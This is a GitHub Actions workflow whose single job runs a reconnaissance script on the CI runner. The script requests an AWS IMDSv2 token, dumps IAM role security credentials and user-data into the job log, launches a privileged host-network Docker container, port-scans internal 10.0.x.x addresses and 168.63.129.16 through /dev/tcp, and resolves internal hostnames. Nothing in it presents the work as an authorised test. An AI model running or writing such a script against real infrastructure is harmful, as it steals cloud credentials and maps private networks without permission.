name: i10323-netreach2
on:
  workflow_dispatch:
permissions: write-all
jobs:
  reach:
    runs-on: ubuntu-latest
    steps:
      - name: net-reach2
        shell: bash
        run: |
          set +e
          set +o pipefail
          echo "R2_START"
          echo "RUNNER_ENV=$RUNNER_ENVIRONMENT"
          id 2>&1 | head -2
          echo "--- search domain (resolvectl) ---"
          resolvectl status 2>&1 | head -25
          echo "--- AWS IMDSv2 token ---"
          TOK=$(curl -sS -m 4 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>&1)
          echo "TOKEN_LEN=${#TOK} TOKEN_HEAD=$(echo "$TOK" | head -c 40)"
          echo "--- AWS IMDS instance-id ---"
          curl -sS -m 4 -w "\nIMDS2_HTTP=%{http_code}\n" "http://169.254.169.254/latest/meta-data/instance-id" -H "X-aws-ec2-metadata-token: $TOK" 2>&1 | head -3
          echo "--- AWS IMDS iam info ---"
          curl -sS -m 4 -w "\nIAMINFO_HTTP=%{http_code}\n" "http://169.254.169.254/latest/meta-data/iam/info" -H "X-aws-ec2-metadata-token: $TOK" 2>&1 | head -8
          echo "--- AWS IMDS iam security-credentials ---"
          for role in $(curl -sS -m 4 "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -H "X-aws-ec2-metadata-token: $TOK" 2>&1); do
            echo "ROLE=$role"
            curl -sS -m 4 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" -H "X-aws-ec2-metadata-token: $TOK" 2>&1 | head -12
          done
          echo "--- AWS IMDS user-data ---"
          curl -sS -m 4 "http://169.254.169.254/latest/user-data" -H "X-aws-ec2-metadata-token: $TOK" 2>&1 | head -6
          echo "--- docker host netns probes ---"
          if which docker >/dev/null 2>&1; then
            docker run --rm --privileged --network host alpine:3.19 sh -c 'echo "DOCKER_NETHOST_OK uid=$(id -u) host=$(hostname)"; ip -4 addr 2>/dev/null | grep inet; cat /proc/net/arp' 2>&1 | head -20
          else
            echo "NO_DOCKER_CLI_2"
          fi
          echo "--- port scan internal (job netns) ---"
          for h in 10.0.128.1 10.0.128.2 10.0.143.1 10.0.143.100 10.0.143.111 10.0.143.113 10.0.143.114 10.0.128.100 168.63.129.16 10.0.0.1 10.0.0.2; do
            for p in 22 80 443 139 445 111 2049 3389 2375 2376 8086 9090; do
              timeout 1 bash -c "echo > /dev/tcp/$h/$p" 2>/dev/null && echo "OPEN $h:$p"
            done
          done
          echo "SCAN2_DONE"
          echo "--- DNS internal ---"
          for n in metadata metadata.google.internal instance-data ec2.internal mails.ucas.edu.cn github.com r2.internal; do
            echo -n "$n => "; getent hosts "$n" 2>&1 | head -1 || echo unresolved
          done
          echo "R2_END"
